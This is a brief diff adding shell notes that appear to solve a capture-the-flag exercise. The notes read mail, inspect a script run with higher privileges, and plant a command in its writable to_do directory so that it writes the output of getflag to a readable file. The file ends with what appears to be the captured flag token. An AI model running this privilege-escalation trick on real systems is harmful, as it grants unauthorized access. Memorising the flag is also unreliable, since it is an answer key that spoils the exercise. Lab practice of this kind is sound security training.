@@ -1,0 +1,12 @@
+cd /var/mail
+cd /var/spool/mail/
+
+sh /usr/sbin/openarenaserver
+cat /usr/sbin/openarenaserver
+
+echo "echo \$(getflag) > /opt/openarenaserver/.flag" > /opt/openarenaserver/to_do
+
+ls -la /opt/openarenaserver/ ; date
+cat /opt/openarenaserver/.flag
+
+viuaaale9huek52boumoomioc
